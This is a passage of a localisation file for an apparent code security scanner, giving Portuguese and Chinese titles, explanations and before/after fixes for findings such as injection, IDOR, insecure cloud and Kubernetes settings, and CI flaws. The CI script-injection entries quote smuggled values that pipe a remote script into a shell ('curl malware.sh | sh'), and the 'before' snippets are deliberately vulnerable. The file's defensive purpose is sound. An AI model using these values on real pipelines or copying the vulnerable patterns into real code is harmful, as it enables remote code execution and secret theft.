      "O site redireciona o utilizador para um endereço obtido diretamente do pedido (query, body, params) sem verificar que é um domínio conhecido. Um link que parece apontar para o seu site pode, na verdade, levar a uma página de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Alterar um número no endereço pode mostrar os dados de outra pessoa",
    description:
      "Uma query à base de dados usa diretamente um identificador obtido do URL (req.params.id) sem verificar, nas linhas próximas, que pertence ao utilizador que está a fazer o pedido. Alterar o id no endereço pode dar acesso aos dados de outro utilizador — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "O formulário de login não bloqueia demasiadas tentativas seguidas",
    description:
      "Uma rota de login está definida no ficheiro, mas não há nenhum vestígio de middleware de rate-limiting no mesmo ficheiro. Sem um limite de tentativas, um atacante pode tentar palavras-passe em sequência (brute force) sem ser travado.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Palavras-passe ou dados sensíveis acabam nos logs",
    description:
      "Uma chamada a console.log (ou semelhante) inclui uma variável chamada password, token, secret ou apiKey. Se estes logs acabarem num serviço externo ou num ficheiro, os dados sensíveis ficam expostos muito mais tempo do que o necessário.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "k8s-run-as-root": {
    title: "Um contentor no manifesto Kubernetes está definido para correr como root",
    description:
      '"runAsUser: 0" ou "runAsNonRoot: false" no securityContext forçam explicitamente o contentor a correr como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o anfitrião — ou um impacto mais amplo.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Um contentor no manifesto Kubernetes pode obter mais privilégios do que os que tinha ao iniciar",
    description:
      '"allowPrivilegeEscalation: true" no securityContext permite que um processo dentro do contentor obtenha mais privilégios do que o processo que o iniciou (ex. através de um binário setuid). Combinado com uma vulnerabilidade na aplicação, é mais um passo para executar código com mais privilégios do que o pretendido.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Um pod no manifesto Kubernetes partilha a rede, os processos ou a memória partilhada do anfitrião",
    description:
      '"hostNetwork", "hostPID" ou "hostIPC" definidos como true retiram o pod do seu isolamento normal: hostNetwork expõe o pod na rede do anfitrião (contornando as políticas de rede do cluster), hostPID dá-lhe visibilidade sobre todos os processos na máquina anfitriã, hostIPC dá-lhe acesso à memória partilhada do anfitrião. Quase nunca necessário para uma app normal — tipicamente só para ferramentas de sistema/monitorização de baixo nível.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "O Block Public Access está desativado num bucket S3 definido em Terraform",
    description:
      'Uma ou mais das quatro proteções em "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) estão definidas como false. Não significa que o bucket já seja público, mas remove uma rede de segurança que impediria que se tornasse público por engano no futuro.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Uma política IAM definida em Terraform concede acesso total",
    description:
      'Uma statement com ação "*" e recurso "*" concede acesso total a todos os serviços e recursos da AWS — a mesma verificação já feita sobre o estado IAM em produção, aqui lida diretamente a partir do código antes mesmo de ser aplicada. Pode ser intencional para um perfil de emergência, mas deve ser confirmado: para uso diário, conceda apenas as permissões realmente necessárias.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::o-seu-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Um bucket do Google Cloud Storage é tornado legível por qualquer pessoa",
    description:
      'Um recurso "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" concede um perfil a "allUsers" ou "allAuthenticatedUsers" — o primeiro torna o bucket legível por qualquer pessoa na internet, mesmo sem conta Google; o segundo por qualquer pessoa com uma conta Google qualquer, não apenas quem deveria ter acesso.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguem@example.com"  # apenas quem deve mesmo ter acesso, não allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "O acesso público a blobs está ativado numa conta de armazenamento do Azure",
    description:
      '"allow_blob_public_access" está definido como true numa "azurerm_storage_account": qualquer pessoa que saiba o URL de um blob/container tornado público pode lê-lo, sem nenhuma autenticação.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Um perfil IAM da Google Cloud concede acesso total (Owner/Editor)",
    description:
      'Um "google_project_iam_binding"/"google_project_iam_member" (ou o equivalente ao nível de organização/pasta) atribui o perfil primitivo "roles/owner" ou "roles/editor" — acesso quase total a todos os serviços do projeto. Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas os perfis predefinidos mais específicos que são realmente necessários.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # apenas o perfil predefinido realmente necessário, não roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Uma atribuição de perfil do Azure concede acesso total (Owner)",
    description:
      'Uma "azurerm_role_assignment" atribui o perfil "Owner" — acesso total, incluindo controlo sobre as permissões de outros utilizadores, sobre todo o scope atribuído (subscrição, grupo de recursos...). Pode ser intencional para uma conta de emergência, mas deve ser confirmado: para uso diário, conceda apenas o perfil mais específico realmente necessário (ex. "Contributor" num único grupo de recursos).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # apenas o perfil mais específico realmente necessário, não Owner em toda a subscrição\n}`,
    },
  },
  "weak-random-token": {
    title: "Um token de segurança é gerado com um gerador de números aleatórios que não é seguro",
    description:
      "Um valor com um nome como token/session/reset/otp/csrf é gerado com Math.random() (JS), random.random() (Python) ou rand() (PHP) — geradores não pensados para segurança, cujas sequências são previsíveis. Um token gerado assim pode ser adivinhado ou reconstruído, anulando o propósito para o qual existe (ex. um link de reposição de palavra-passe que qualquer pessoa poderia prever).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, não Math.random — imprevisível`,
    },
  },
  "ldap-injection": {
    title: "Um filtro LDAP é construído concatenando diretamente um valor do pedido",
    description:
      'Uma linha que constrói um filtro LDAP (ex. "(uid=...)") inclui diretamente um valor obtido do pedido, sem nenhum escape dos caracteres especiais do LDAP. Quem controla esse valor pode alterar a lógica do filtro — por exemplo, contornar uma verificação de autenticação ou ler dados do diretório que não deveria ver.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // os caracteres especiais do LDAP devem ser sempre escapados antes de os usar num filtro\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "Um valor do pedido acaba diretamente num cabeçalho de resposta HTTP",
    description:
      "Um cabeçalho de resposta HTTP é definido com um valor obtido diretamente do pedido (query, body, params), sem verificar que não contém uma quebra de linha (CRLF). Um atacante pode inserir cabeçalhos adicionais ou até uma resposta inteiramente diferente — response splitting — podendo manipular caching, cookies ou o conteúdo mostrado a outros utilizadores.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "O Dockerfile não define um utilizador não-root",
    description:
      "Nenhuma instrução USER no Dockerfile: sem uma, o contentor corre como root. Se um atacante conseguir executar código dentro do contentor (ex. explorando uma biblioteca vulnerável), ser root dentro do contentor facilita uma fuga para o anfitrião — ou um impacto mais amplo no sistema envolvente.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "O manifesto Kubernetes não impõe explicitamente a execução como utilizador não-root",
    description:
      'Nenhum "runAsNonRoot" em nenhuma parte do manifesto (nem ao nível do pod nem do contentor): sem o definir, um contentor corre como o utilizador que a sua imagem define — muitas vezes root por predefinição, se a própria imagem não tiver alterado isso. Defini-lo explicitamente como true faz com que o pod falhe ao iniciar se a imagem ainda tentar correr como root, em vez de só se descobrir isso depois de um incidente.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Uma ação de terceiros na CI não está fixa numa versão precisa (commit SHA)",
    description:
      'O workflow usa uma ação de terceiros referenciada por tag ou branch (ex. "@v1", "@main") em vez de por commit SHA. Quem a mantém — ou quem comprometer a sua conta — pode mover essa referência para um commit diferente a qualquer momento, alterando silenciosamente o que corre na CI, com acesso aos seus segredos. Um commit SHA aponta sempre para exatamente o mesmo código.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fixa no commit SHA — atualize o SHA quando atualizar a versão`,
    },
  },
  "gha-excessive-permissions": {
    title: "O workflow concede a si próprio todas as permissões do token em vez de apenas as que usa",
    description:
      '"permissions: write-all" concede ao GITHUB_TOKEN do workflow acesso de escrita a tudo — issues, pull requests, pacotes, deployments — mesmo que o workflow só use parte disso. Se um passo do workflow for comprometido (uma dependência maliciosa, um script injetado), essas permissões mais amplas aumentam o que quem o explorar consegue fazer.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # apenas as permissões que o workflow realmente usa`,
    },
  },
  "insecure-cookie-flags": {
    title: "Uma cookie de sessão ou autenticação é definida sem as flags Secure e HttpOnly",
    description:
      'Uma cookie com um nome parecido com session/auth/token é definida sem "httpOnly" e "secure" entre as suas opções. Sem httpOnly, o JavaScript na página — incluindo código injetado via XSS — pode ler essa cookie. Sem secure, pode também ser enviada numa ligação HTTP não cifrada.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependência vulnerável:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ainda não é conhecida nenhuma versão corrigida — considere um pacote alternativo ou acompanhe as atualizações do projeto."
      ),
    },
  }),
  "docker-unpinned-base-image": {
    title: 'A imagem base do Dockerfile usa a tag ":latest"',
    description:
      'Uma instrução FROM usa explicitamente a tag ":latest" em vez de uma versão precisa. "latest" muda ao longo do tempo: a mesma build, refeita noutro momento, pode obter uma versão diferente da imagem base — uma build não reprodutível, e uma atualização indesejada pode chegar sem que ninguém tenha decidido que deveria.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "O Dockerfile descarrega um ficheiro remoto com ADD em vez de COPY",
    description:
      "Uma instrução ADD com um URL http/https descarrega um ficheiro da internet durante a build, sem verificação de integridade e com o conteúdo invisível no repositório. Se esse URL alguma vez for comprometido, a build inclui conteúdo arbitrário sem que ninguém repare apenas lendo o Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperado>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Um valor controlado por um utilizador externo passa por uma segunda shell no pipeline do GitLab CI',
      description: 'Uma linha de "script:" (ou "before_script:"/"after_script:") usa "eval" ou "sh -c"/"bash -c" junto com uma variável predefinida do GitLab como o título da merge request, a mensagem de commit ou o nome do branch — todas editáveis por quem abrir uma merge request, mesmo a partir de um fork externo. O valor é expandido uma primeira vez pela shell externa e depois colado dentro de uma string que a segunda shell interpreta de novo como código: um título como "$(curl malware.sh | sh)" executaria comandos arbitrários no pipeline, com acesso a todos os segredos disponíveis nesse job.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passado como argumento ao comando, nunca dentro de uma string "bash -c" que o reinterpretaria`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker no pipeline do GitLab CI corre com a cifragem TLS desativada',
      description: 'O job usa o serviço "docker:dind" (Docker-in-Docker, necessário para construir imagens dentro do pipeline) mas define "DOCKER_TLS_CERTDIR" como uma string vazia, desativando por completo a cifragem TLS entre o cliente Docker e o daemon dind. Sem TLS, quem conseguir alcançar essa porta na mesma rede interna do runner pode controlar o daemon Docker — que corre com privilégios alargados — em vez de ficar limitado ao job que o deveria usar.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS ativo entre o cliente Docker e o daemon dind — "" desativa-o por completo`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'A imagem Docker do pipeline do GitLab CI não está fixada numa versão precisa',
      description: 'Um "image:" do pipeline aponta para uma imagem sem tag (equivale a ":latest") ou explicitamente a ":latest". Quem mantém essa imagem pode substituir o seu conteúdo a qualquer momento sem que o repositório mude — o mesmo pipeline pode passar a usar código diferente de um dia para o outro, um risco de supply chain conceptualmente idêntico a uma GitHub Action referenciada por tag em vez de por commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # uma tag específica (ou melhor ainda um digest "node@sha256:...") em vez de "latest"`,
      },
    },
},
  zh: {
  "supabase-service-role-in-client": {
    title: "Supabase 的密钥出现在面向浏览器的文件中",
    description:
      "一个带有公开前缀的变量（如 NEXT_PUBLIC_、VITE_）或一个客户端文件引用了 Supabase 的 service role key。这个密钥会绕过 Row Level Security：一旦进入浏览器打包文件，任何人都能读取它并以数据库管理员身份操作。",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts（仅服务端）\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "密码或密钥被直接写在代码里",
    description:
      "一个 API 密钥、令牌或密码看起来是以字面值写入的，而不是从环境变量读取。任何读到源代码（如果是公开仓库，还包括仓库本身）的人都能拿到这个密钥。",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "一个包含项目真实密码的文件出现在被分析的文件中",
    description:
      "分析中包含了一个带有真实值的 .env 文件（而不是 .env.example）。如果这个文件进入仓库或公开部署，其中的所有凭证都会被暴露。",
    fix: {
      before: `# .env（不小心提交了）\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example（已提交）\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env 不进入仓库（.gitignore）`,
    },
  },
  "missing-row-level-security": {
    title: "任何人都能读取或修改所有用户的数据",
    description:
      "Row Level Security 被禁用了，或者某条策略允许任何人访问（USING (true)）而不检查请求者身份。任何已登录的用户——甚至匿名用户——都能读取或修改其他所有人的数据。",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "用户输入的值被直接拼接进数据库查询",
    description:
      "一条 SQL 查询是通过直接拼接或插值字符串构建的，而不是使用参数化查询。如果这段文本（哪怕是间接地）来自用户，就可能改变查询本身的逻辑——SQL 注入。",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "密码似乎没有被妥善保护",
    description:
      "密码字段被原样保存为请求中传来的内容，文件中也看不到任何哈希函数（bcrypt、argon2、scrypt）。一旦数据库被攻破，所有密码都能立即被使用。",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "用于签发登录凭证的密钥以明文写在代码中",
    description:
      "传给 jwt.sign / jwt.verify 的密钥（或 JWT_SECRET 变量）是代码中的字面值，而不是来自环境变量。任何读到它的人都能为任意用户伪造有效的访问令牌。",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "服务器可能被强制执行外部命令",
    description:
      "一个执行系统命令的函数（exec、execSync、spawn）接收了一个通过拼接或插值构建的字符串。如果这个字符串中有一部分来自用户输入，控制这部分内容的人就能在服务器上执行任意命令。",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "服务器上的文件可以通过从外部指定路径来被读取或写入",
    description:
      "一个读取、写入或发送文件的函数，直接从请求的值（query、body、params）中获取路径，而没有检查路径是否始终位于允许的目录内。攻击者可以插入 \"../\" 来跳出预期目录，读取或覆盖服务器上的任意文件（例如包含凭证的配置文件）。",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("路径不允许")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "用户输入的值在 MongoDB 查询中被当作代码执行",
    description:
      "MongoDB 的 $where 操作符会对每个文档执行服务端 JavaScript——如果这段字符串是通过拼接用户输入的值构建的，控制这个值的人就能让任意代码在数据库的上下文中执行，而不只是像普通 SQL 注入那样改变过滤条件。",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "用户输入的值被当作模板解析，而不是当作数据",
    description:
      "一个编译/渲染模板的函数，从请求的值中接收了整个模板，而不是使用固定模板、只传入数据。攻击者可以直接用模板引擎的语法书写（例如 Jinja2 的 {{7*7}}），从而在服务器上执行代码——服务端模板注入（SSTI），往往会导致任意命令执行，而不只是像 XSS 那样的显示问题。",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML 解析器可能被强制读取文件或发起外部请求",
    description:
      "创建 XML 解析器（DocumentBuilderFactory）时，附近的代码没有显式禁用外部实体（DOCTYPE）。如果解析器接收来自不可信来源的 XML，攻击者就能定义一个外部实体，读取服务器上的文件，或让它访问攻击者指定的地址——XML 外部实体注入（XXE）。",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "密钥被直接写在 Dockerfile 的 ENV 或 ARG 指令中",
    description:
      "一个名字类似 password/secret/token/key 的变量，在 ENV 或 ARG 指令中有一个字面值。与通常不会进入镜像的 .env 文件不同，这个值会被直接烘焙进 Docker 镜像本身——任何能拉取镜像或查看层历史的人都能还原它，即使这一行在后续版本的 Dockerfile 中被删除了也一样。",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# 通过以下方式传入：docker build --build-arg DB_PASSWORD=***（或者更好的做法是\n# 使用永远不会进入层历史的 BuildKit secret mount）`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes 清单中的一个容器以特权模式运行",
    description:
      "容器 securityContext 中的 \"privileged: true\" 几乎禁用了容器与宿主机之间的所有常规隔离：容器可以访问宿主机的设备、更改其网络配置，在很多情况下还能实际获得运行该容器的机器的 root 权限。普通应用几乎从不需要这个设置。",
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 只添加真正需要的 capabilities`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "密钥以明文写在 Kubernetes 清单的环境变量中",
    description:
      "一个名字类似 password/secret/token/key 的环境变量有一个字面值（\"value:\"），而不是从 Secret 中读取（\"valueFrom.secretKeyRef\"）。清单文件本身——常常会被提交到仓库——因此以明文包含了这个密钥，即使只能读取配置、不能在集群中执行命令的人也能看到。",
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraform 中的一个安全组向整个互联网开放了敏感端口",
    description:
      "一条包含 0.0.0.0/0（任意 IP 地址）的 \"cidr_blocks\" 规则，涉及一个敏感端口——SSH（22）、RDP（3389），或是常见的数据库端口（MySQL、Postgres、MongoDB、Redis、SQL Server）。互联网上的任何人都能尝试连接这个服务，而不只是本该能连接的人。",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloud 防火墙规则向整个互联网开放了敏感端口",
    description:
      "一个 \"google_compute_firewall\" 资源的 \"source_ranges\" 包含 0.0.0.0/0（任意 IP 地址），允许流量访问一个敏感端口——SSH（22）、RDP（3389），或是常见的数据库端口（MySQL、Postgres、MongoDB、Redis、SQL Server）。互联网上的任何人都能尝试连接这个服务，而不只是本该能连接的人。",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azure 网络规则向整个互联网开放了敏感端口",
    description:
      "一条网络安全规则（\"azurerm_network_security_rule\"，或 \"azurerm_network_security_group\" 内的 \"security_rule\" 块），其 \"source_address_prefix\" 为 \"*\" 或 \"0.0.0.0/0\"，方向为 \"Inbound\"，访问权限为 \"Allow\"，并涉及一个敏感端口——SSH（22）、RDP（3389），或常见的数据库端口。互联网上的任何人都能尝试连接这个服务，而不只是本该能连接的人。",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "密钥被写成 Terraform 变量的默认值",
    description:
      "一个名字类似 password/secret/token/key 的变量，在它的 \"default\" 中有一个字面值。与运行时传入的值（tfvars、TF_VAR_* 环境变量）不同，默认值会进入源代码——如果仓库是共享的或公开的，任何人都能看到它，即使没有 Terraform 状态的访问权限也一样。",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # 不设默认值：应通过 .tfvars 文件（不纳入 git）或 TF_VAR_db_password 环境变量传入\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "外部用户可控的值被直接带入 CI 的 shell 命令",
    description:
      "GitHub Actions 工作流中的一条 \"run:\" 命令，直接插值了诸如 pull request 标题、分支名或评论文本这样的值——这些内容任何打开 pull request 或发表评论的人都能写入，即使来自外部 fork 也一样。像 `\"; curl malware.sh | sh #` 这样的值，会在 CI 中执行任意命令，并能访问该工作流中可用的所有密钥。",
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 作为环境变量传入，绝不直接插值进命令`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "工作流以仓库密钥的访问权限运行外部 pull request 的代码",
    description:
      "该工作流使用了 \"pull_request_target\"——即便 pull request 来自一个无关的 fork，它也会以基础仓库的权限和密钥运行——并且检出的是 pull request 本身的代码（\"github.event.pull_request.head\"），而不是基础分支。这实际上让打开 pull request 的人能够运行自己的代码，并拿到这些密钥的访问权限。",
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # 检出基础分支，而不是 PR 本身的代码——如果不需要更广的\n      # 权限/密钥，也可以改用 "pull_request" 而不是 "pull_request_target"。\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "请求数据以可执行代码的格式被反序列化",
    description:
      "pickle（Python）、unserialize()（PHP）、ObjectInputStream（Java）或 node-serialize 库（Node）正在反序列化一个直接取自请求的值。与 JSON 不同，这些格式能在反序列化过程中本身就表示并执行代码——控制所发送值的人可能借此在服务器上实现任意代码执行。",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # 与 pickle 不同，JSON 在解析时绝不会执行代码`,
    },
  },
  "jwt-none-algorithm": {
    title: "代码显式接受未签名的 JWT 令牌（\"none\" 算法）",
    description:
      "验证 JWT 令牌所接受的算法中出现了 \"none\"。使用 \"none\" 算法的令牌没有任何需要验证的签名：任何人都能构造一个包含任意内容（例如管理员角色）的令牌，而代码会将其视为合法。",
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 绝不要把 "none" 列入可接受的算法`,
    },
  },
  "unprotected-new-table": {
    title: "似乎正在创建一张没有保护的新表",
    description:
      "一个 SQL 迁移创建了一张表，但没有在同一文件中为这张表启用 Row Level Security。只要一直保持这样，这张表在创建之初就没有任何读写限制。",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "网站接受来自任何其他网站的请求",
    description:
      "CORS 头被设置为接受任意来源（*）的请求，或者 cors() 中间件被无限制地使用。任何第三方网站都能借助已登录用户的浏览器调用你的 API。",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
